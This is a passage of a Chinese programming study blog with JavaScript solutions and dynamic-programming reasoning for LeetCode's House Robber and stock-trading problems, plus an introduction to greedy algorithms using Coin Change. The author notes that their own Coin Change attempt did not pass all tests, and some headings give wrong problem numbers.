id="思路1-amp-题解-7"><a href="#思路1-amp-题解-7" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><ul><li>首先考虑能否用一位数组 DP ，但是显然不能存储”偷”或者”没偷”的状态，所以使用二维数组。</li><li>a[i] 表示到 i 天为止<strong>能偷</strong>的最大值。</li><li>DP 方程：<code>a[i][0] = Math.max(a[i - 1][0], a[i - 1][1]); a[i][1] = a[i - 1][0] + nums[i];</code></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rob = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> n = nums.length;</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">let</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>(n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">    a[i] = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">2</span>).fill(<span class="number">0</span>);</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="comment">// 0 不偷 1偷</span></span><br><span class="line">  a[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>, a[<span class="number">0</span>][<span class="number">1</span>] = nums[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; n; i++)&#123;</span><br><span class="line">    a[i][<span class="number">0</span>] = <span class="built_in">Math</span>.max(a[i - <span class="number">1</span>][<span class="number">0</span>], a[i - <span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">    a[i][<span class="number">1</span>] = a[i - <span class="number">1</span>][<span class="number">0</span>] + nums[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.max(a[n - <span class="number">1</span>][<span class="number">0</span>], a[n - <span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-6"><a href="#思路2-amp-题解-6" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><ul><li>用 a[i] 表示到 i 天为止<strong>已经偷到</strong>的最大现金。</li><li>DP 方程：<code>a[i] = Math.max(a[i - 1], a[i - 2] + nums[i]);</code></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rob = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> n = nums.length, a = <span class="keyword">new</span> <span class="built_in">Array</span>(n);</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">  a[<span class="number">0</span>] = nums[<span class="number">0</span>], a[<span class="number">1</span>] = <span class="built_in">Math</span>.max(nums[<span class="number">0</span>], nums[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">let</span> res = <span class="built_in">Math</span>.max(a[<span class="number">0</span>], a[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">2</span>; i &lt; n; i++)&#123;</span><br><span class="line">    a[i] = <span class="built_in">Math</span>.max(a[i - <span class="number">1</span>], a[i - <span class="number">2</span>] + nums[i]);</span><br><span class="line">    res = <span class="built_in">Math</span>.max(res, a[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>改进成 O（1）的空间复杂度：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rob = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> prevMax = <span class="number">0</span>, curMax = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> n <span class="keyword">of</span> nums) &#123;</span><br><span class="line">        <span class="keyword">let</span> temp = curMax;</span><br><span class="line">        curMax = <span class="built_in">Math</span>.max(prevMax + n, curMax);</span><br><span class="line">        prevMax = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.max(curMax, prevMax);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode219——打家劫舍-II（☆☆）"><a href="#LeetCode219——打家劫舍-II（☆☆）" class="headerlink" title="LeetCode219——打家劫舍 II（☆☆）"></a>LeetCode219——打家劫舍 II（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/house-robber-ii/">跳转地址</a></p><h3 id="思路-amp-题解-9"><a href="#思路-amp-题解-9" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>DP 方程还是没变，只是多设置了一个 dp 数组。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rob = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> n = nums.length;</span><br><span class="line">  <span class="keyword">if</span> (n &lt; <span class="number">2</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> nums[<span class="number">0</span>] || <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> dp1 = [nums[<span class="number">0</span>], <span class="built_in">Math</span>.max(nums[<span class="number">0</span>], nums[<span class="number">1</span>])];</span><br><span class="line">  <span class="keyword">const</span> dp2 = [<span class="number">0</span>, nums[<span class="number">1</span>]];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">2</span>; i &lt; n; i++) &#123;</span><br><span class="line">    dp1[i] = i === n - <span class="number">1</span> ? dp1[i - <span class="number">1</span>] : <span class="built_in">Math</span>.max(nums[i] + dp1[i - <span class="number">2</span>], dp1[i - <span class="number">1</span>]);</span><br><span class="line">    dp2[i] = <span class="built_in">Math</span>.max(nums[i] + dp2[i - <span class="number">2</span>], dp2[i - <span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.max(dp1[n - <span class="number">1</span>], dp2[n - <span class="number">1</span>]);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="动态规划——买卖股票"><a href="#动态规划——买卖股票" class="headerlink" title="动态规划——买卖股票"></a>动态规划——买卖股票</h2><p>共有三个状态：</p><ul><li>第 i 天</li><li>交易次数 k</li><li>是否持有股票 （0 不持有，1 持有）</li></ul><p>故可以用 <code>dp[i][k][s]</code> 表示 DP 状态数组，且<code>dp[n-1][k][0]</code>是最后一天允许的最大交易次数的最大利润。</p><p>DP方程：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 今天不持有股票。最大利润为昨天不持有股票的利润，或者今天卖出昨天股票的利润。</span></span><br><span class="line">dp[i][k][<span class="number">0</span>] = Max(dp[i-<span class="number">1</span>][k][<span class="number">0</span>], dp[i-<span class="number">1</span>][k][<span class="number">1</span>] + prices[i])</span><br><span class="line"><span class="comment">// 今天持有股票。最大利润为昨天持有股票的利润</span></span><br><span class="line">dp[i][k][<span class="number">1</span>] = Max(dp[i-<span class="number">1</span>][k][<span class="number">1</span>], dp[i-<span class="number">1</span>][k-<span class="number">1</span>][<span class="number">0</span>] - prices[i])</span><br></pre></td></tr></table></figure><p>初始数组：</p><ul><li><code>dp[-1][k][0] = 0</code>  因为一天从 0 开始，这里 i 是 -1</li><li><code>dp[-1][k][1] = -Infinity</code>  因为在第一天之前不能持有任何股票</li><li><code>dp[i][0][0] = 0</code>  因为 k = 0。不会有任何交易，所以利润为零</li><li><code>dp[i][0][1] = -Infinity</code>  因为k = 0。不能在不开始交易的情况下持有任何股票</li></ul><h2 id="LeetCode122——买卖股票的最佳时机（☆）"><a href="#LeetCode122——买卖股票的最佳时机（☆）" class="headerlink" title="LeetCode122——买卖股票的最佳时机（☆）"></a>LeetCode122——买卖股票的最佳时机（☆）</h2><p><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/#/description">跳转地址</a></p><h3 id="自己的代码-14"><a href="#自己的代码-14" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">prices</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> minPrice = prices[<span class="number">0</span>], profit = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; prices.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (prices[i] &lt; minPrice) &#123;</span><br><span class="line">      minPrice = prices[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (prices[i] - minPrice &gt; profit) &#123;</span><br><span class="line">      profit = prices[i] - minPrice;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> profit;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路1-amp-题解-8"><a href="#思路1-amp-题解-8" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">prices</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> min = <span class="built_in">Number</span>.MAX_SAFE_INTEGER; </span><br><span class="line">    <span class="keyword">var</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">        min = <span class="built_in">Math</span>.min(min, prices[i]);</span><br><span class="line">        max = <span class="built_in">Math</span>.max(max, prices[i] - min);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-7"><a href="#思路2-amp-题解-7" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>重点看动态规划：即 k=1 。 当 k 为 1 时，k 的存在不会以任何方式改变数组状态，因此我们可以忽略它。</p><p>DP 方程：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">dp[i][<span class="number">0</span>] = max(dp[i-<span class="number">1</span>][<span class="number">0</span>], dp[i-<span class="number">1</span>][<span class="number">1</span>] + prices[i])</span><br><span class="line">dp[i][<span class="number">1</span>] = max(dp[i-<span class="number">1</span>][<span class="number">1</span>], <span class="number">0</span> - prices[i])</span><br></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">prices</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> n = prices.length;</span><br><span class="line">  <span class="keyword">let</span> dp = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">    dp[i] = [];</span><br><span class="line">    <span class="keyword">if</span>(i === <span class="number">0</span>)&#123;</span><br><span class="line">      dp[i][<span class="number">0</span>] = <span class="number">0</span>; </span><br><span class="line">      dp[i][<span class="number">1</span>] = -prices[i];</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[i][<span class="number">0</span>] = <span class="built_in">Math</span>.max(dp[i-<span class="number">1</span>][<span class="number">0</span>], dp[i-<span class="number">1</span>][<span class="number">1</span>] + prices[i]);</span><br><span class="line">    dp[i][<span class="number">1</span>] = <span class="built_in">Math</span>.max(dp[i-<span class="number">1</span>][<span class="number">1</span>],  -prices[i])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dp[n-<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>降低空间复杂度：不构造 DP 矩阵，从而将空间复杂度降低到 O(1)，因为新状态仅与相邻状态相关。（状态存储在单个变量中）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">prices</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> d_i10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> d_i11 = -<span class="literal">Infinity</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;prices.length;i++)&#123;</span><br><span class="line">    d_i10 = <span class="built_in">Math</span>.max(d_i10, d_i11 + prices[i]);</span><br><span class="line">    d_i11 = <span class="built_in">Math</span>.max(d_i11, <span class="number">0</span> - prices[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> d_i10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode122——买卖股票的最佳时机-II（☆）"><a href="#LeetCode122——买卖股票的最佳时机-II（☆）" class="headerlink" title="LeetCode122——买卖股票的最佳时机 II（☆）"></a>LeetCode122——买卖股票的最佳时机 II（☆）</h2><p><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-ii/">跳转地址</a></p><h3 id="自己的代码-15"><a href="#自己的代码-15" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>没写出来，有很多种情况。除了案例给的，还有[1,3,2,4,5]这种。不可能用分类讨论来做吧？</p><h3 id="思路1-amp-题解-9"><a href="#思路1-amp-题解-9" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>动态规划= （<a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-ii/solution/mai-mai-gu-piao-de-zui-jia-shi-ji-ii-by-leetcode-s/">占个坑</a>，以后再看吧）</p><p>接上：即 k = +Infinity。同样可以忽略 k 。DP 方程：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">dp[i][<span class="number">0</span>] = max(dp[i-<span class="number">1</span>][<span class="number">0</span>], dp[i-<span class="number">1</span>][<span class="number">1</span>] + prices[i])</span><br><span class="line">dp[i][<span class="number">1</span>] = max(dp[i-<span class="number">1</span>][<span class="number">1</span>], dp[i-<span class="number">1</span>][<span class="number">0</span>] - prices[i])</span><br></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">prices</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> d_ik0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> d_ik1 = -<span class="literal">Infinity</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;prices.length;i++)&#123;</span><br><span class="line">    d_ik0 = <span class="built_in">Math</span>.max(d_ik0 , d_ik1 + prices[i]);</span><br><span class="line">    d_ik1 = <span class="built_in">Math</span>.max(d_ik1, d_ik0 - prices[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> d_ik0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路2-amp-题解-8"><a href="#思路2-amp-题解-8" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>贪心：<strong>当天可以卖了之后，又买一股！</strong>假设，如果今天我买了，明天是否赚？（只要是能赚钱，就统统头天买，今天买！）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">prices</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>, len = prices.length; i &lt; len; i++)&#123;</span><br><span class="line">        ans += <span class="built_in">Math</span>.max(<span class="number">0</span>, prices[i] - prices[i - <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><ul><li><p>时间复杂度：O(n)，其中 nn 为数组的长度。我们只需要遍历一次数组即可。</p></li><li><p>空间复杂度：O(1)。只需要常数空间存放若干变量。</p></li></ul><h3 id="LeetCode123——买卖股票的最佳时机-III（☆☆☆）"><a href="#LeetCode123——买卖股票的最佳时机-III（☆☆☆）" class="headerlink" title="LeetCode123——买卖股票的最佳时机 III（☆☆☆）"></a>LeetCode123——买卖股票的最佳时机 III（☆☆☆）</h3><p><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-iii/">跳转地址</a></p><h3 id="思路-amp-题解-10"><a href="#思路-amp-题解-10" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>DP k = 2，需要穷尽 k 的值，与第一笔交易一起保存第二笔交易的状态。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">dp[i][<span class="number">2</span>][<span class="number">0</span>] = max(dp[i-<span class="number">1</span>][<span class="number">2</span>][<span class="number">0</span>], dp[i-<span class="number">1</span>][<span class="number">2</span>][<span class="number">1</span>] + prices[i])</span><br><span class="line">dp[i][<span class="number">2</span>][<span class="number">1</span>] = max(dp[i-<span class="number">1</span>][<span class="number">2</span>][<span class="number">1</span>], dp[i-<span class="number">1</span>][<span class="number">1</span>][<span class="number">0</span>] - prices[i])</span><br><span class="line">dp[i][<span class="number">1</span>][<span class="number">0</span>] = max(dp[i-<span class="number">1</span>][<span class="number">1</span>][<span class="number">0</span>], dp[i-<span class="number">1</span>][<span class="number">1</span>][<span class="number">1</span>] + prices[i])</span><br><span class="line">dp[i][<span class="number">1</span>][<span class="number">1</span>] = max(dp[i-<span class="number">1</span>][<span class="number">1</span>][<span class="number">1</span>], -prices[i])</span><br></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">prices</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> d_i20 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> d_i21 = -<span class="literal">Infinity</span>; </span><br><span class="line">  <span class="keyword">let</span> d_i10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> d_i11 = -<span class="literal">Infinity</span>; </span><br><span class="line">    </span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;prices.length; i++)&#123;</span><br><span class="line">    d_i10 = <span class="built_in">Math</span>.max(d_i10, d_i11 + prices[i]);</span><br><span class="line">    d_i11 = <span class="built_in">Math</span>.max(d_i11,  <span class="number">0</span> - prices[i]);</span><br><span class="line">    d_i20 = <span class="built_in">Math</span>.max(d_i20, d_i21 + prices[i]);</span><br><span class="line">    d_i21 = <span class="built_in">Math</span>.max(d_i21, d_i10 - prices[i]);</span><br><span class="line">   </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> d_i20</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode188——买卖股票的最佳时机-IV（☆☆☆）-too-hard"><a href="#LeetCode188——买卖股票的最佳时机-IV（☆☆☆）-too-hard" class="headerlink" title="LeetCode188——买卖股票的最佳时机 IV（☆☆☆）(too hard)"></a>LeetCode188——买卖股票的最佳时机 IV（☆☆☆）(too hard)</h2><p><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-iv/">跳转地址</a></p><h3 id="思路-amp-题解-11"><a href="#思路-amp-题解-11" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>DP：k 为正整数。交易包括买卖，至少需要 2 天。因此有效限制 k 不应超过 n/2（n 为天数）。如果超过，则没有约束效应使 k 等于 +Infinity。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">k, prices</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(prices.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// When k becomes so much larger than the number of prices we can make transactions whenever.</span></span><br><span class="line">    <span class="keyword">if</span>(k &gt; (prices.length / <span class="number">2</span>) )&#123;</span><br><span class="line">      <span class="keyword">let</span> d_ik0 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">let</span> d_ik1 =  -<span class="literal">Infinity</span>;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> i =<span class="number">0</span>; i&lt;prices.length;i++)&#123;</span><br><span class="line">        d_ik0 = <span class="built_in">Math</span>.max(d_ik0, d_ik1 + prices[i]);</span><br><span class="line">        d_ik1 = <span class="built_in">Math</span>.max(d_ik1, d_ik0 - prices[i]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> d_ik0</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> dp = [];</span><br><span class="line">        <span class="keyword">let</span> size = prices.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;size; i++)&#123;</span><br><span class="line">          dp[i] = [];</span><br><span class="line">          <span class="keyword">for</span>(<span class="keyword">let</span> j=<span class="number">0</span>; j&lt;=k; j++)&#123;</span><br><span class="line">            dp[i][j] = []</span><br><span class="line">            <span class="keyword">if</span>(i-<span class="number">1</span> === -<span class="number">1</span> || j-<span class="number">1</span> === -<span class="number">1</span>)&#123;</span><br><span class="line">              dp[i][j][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">              dp[i][j][<span class="number">1</span>] = -prices[i];</span><br><span class="line">              <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i][j][<span class="number">0</span>] = <span class="built_in">Math</span>.max(dp[i-<span class="number">1</span>][j][<span class="number">0</span>], dp[i-<span class="number">1</span>][j][<span class="number">1</span>] + prices[i]);</span><br><span class="line">            dp[i][j][<span class="number">1</span>] = <span class="built_in">Math</span>.max(dp[i-<span class="number">1</span>][j][<span class="number">1</span>], dp[i-<span class="number">1</span>][j-<span class="number">1</span>][<span class="number">0</span>] - prices[i])</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">return</span> dp[size-<span class="number">1</span>][k][<span class="number">0</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode188——最佳买卖股票时机含冷冻期（☆☆）"><a href="#LeetCode188——最佳买卖股票时机含冷冻期（☆☆）" class="headerlink" title="LeetCode188——最佳买卖股票时机含冷冻期（☆☆）"></a>LeetCode188——最佳买卖股票时机含冷冻期（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-cooldown/">跳转地址</a></p><h3 id="思路-amp-题解-12"><a href="#思路-amp-题解-12" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>DP：<strong>k = +Infinity 且有冷却时间</strong>，所以必须在卖出股票后等待一天才能继续交易。我们可以将状态转移方程写为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">dp[i][<span class="number">0</span>] = max(dp[i-<span class="number">1</span>][<span class="number">0</span>], dp[i-<span class="number">1</span>][<span class="number">1</span>] + prices[i])</span><br><span class="line">dp[i][<span class="number">1</span>] = max(dp[i-<span class="number">1</span>][<span class="number">1</span>], dp[i-<span class="number">2</span>][<span class="number">0</span>] - prices[i])</span><br></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">prices</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> d_ik0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> d_ik1 = -<span class="literal">Infinity</span>;</span><br><span class="line">  <span class="keyword">let</span> d_ik0_pre = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;prices.length;i++)&#123;</span><br><span class="line">    <span class="keyword">let</span> d_ik0_old = d_ik0; </span><br><span class="line">    d_ik0 = <span class="built_in">Math</span>.max(d_ik0 , d_ik1 + prices[i]);</span><br><span class="line">    d_ik1 = <span class="built_in">Math</span>.max(d_ik1, d_ik0_pre - prices[i]);</span><br><span class="line">    d_ik0_pre = d_ik0_old;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> d_ik0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode188——买卖股票的最佳时机含手续费（☆☆）"><a href="#LeetCode188——买卖股票的最佳时机含手续费（☆☆）" class="headerlink" title="LeetCode188——买卖股票的最佳时机含手续费（☆☆）"></a>LeetCode188——买卖股票的最佳时机含手续费（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-transaction-fee/">跳转地址</a></p><h3 id="思路-amp-题解-13"><a href="#思路-amp-题解-13" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>DP：<strong>k = +Infinity 含有交易费</strong>。第 i 天买入或卖出股票后的利润应该减去这个金额，因此新的 DP 方程：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">dp[i][k][<span class="number">0</span>] = max(dp[i-<span class="number">1</span>][k][<span class="number">0</span>], dp[i-<span class="number">1</span>][k][<span class="number">1</span>] + prices[i])</span><br><span class="line">dp[i][k][<span class="number">1</span>] = max(dp[i-<span class="number">1</span>][k][<span class="number">1</span>], dp[i-<span class="number">1</span>][k][<span class="number">0</span>] - prices[i] - fee)</span><br><span class="line"><span class="comment">//or</span></span><br><span class="line">dp[i][k][<span class="number">0</span>] = max(dp[i-<span class="number">1</span>][k][<span class="number">0</span>], dp[i-<span class="number">1</span>][k][<span class="number">1</span>] + prices[i] - fee)</span><br><span class="line">dp[i][k][<span class="number">1</span>] = max(dp[i-<span class="number">1</span>][k][<span class="number">1</span>], dp[i-<span class="number">1</span>][k][<span class="number">0</span>] - prices[i])</span><br></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxProfit = <span class="function"><span class="keyword">function</span>(<span class="params">prices, fee</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> d_ik0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> d_ik1 = -<span class="literal">Infinity</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;prices.length;i++)&#123;</span><br><span class="line">    d_ik0 = <span class="built_in">Math</span>.max(d_ik0 , d_ik1 + prices[i]);</span><br><span class="line">    d_ik1 = <span class="built_in">Math</span>.max(d_ik1, d_ik0 - prices[i] - fee);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> d_ik0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="贪心算法"><a href="#贪心算法" class="headerlink" title="贪心算法"></a>贪心算法</h1><p>贪心算法是一种在每一步选择中都采取在当前状态下最好或最优（即最有利）的选择，从而希望导致结果是全局最好或最优的算法。</p><p>贪心算法与动态规划的不同在于它对每个子问题的解决方案都做出选择，不能回退。动态规划则会保存以前的运算结果，并根据以前的结果对当前进行选择，有回退功能。</p><p>贪心法可以解决一些最优化问题， 如：求图中的最小生成树、求哈夫曼编码等。然而对于工程和生活中的问题，贪心法一般不能得到我们所要求的答案。</p><h2 id="LeetCode322——零钱兑换（☆☆）"><a href="#LeetCode322——零钱兑换（☆☆）" class="headerlink" title="LeetCode322——零钱兑换（☆☆）"></a>LeetCode322——零钱兑换（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/coin-change/">跳转地址</a></p><h3 id="自己的代码-16"><a href="#自己的代码-16" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> coinChange = <span class="function"><span class="keyword">function</span>(<span class="params">coins, amount</span>) </span>&#123;</span><br><span class="line">    coins = coins.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> b - a);</span><br><span class="line">    <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (amount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">parseInt</span>(amount / coins[<span class="number">0</span>]) !== <span class="number">0</span>) &#123;</span><br><span class="line">            amount = amount - coins[<span class="number">0</span>];</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        coins.shift();</span><br><span class="line">        <span class="comment">// 注意！判断coins是否为[]时，不能用 === ，也不能！，因为数组是对象。</span></span><br><span class="line">        <span class="keyword">if</span> (coins.length === <span class="number">0</span> &amp;&amp; amount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>未AC，感觉思路就是这样，没什么问题。但是几个极限测试点没有过。</p><h3 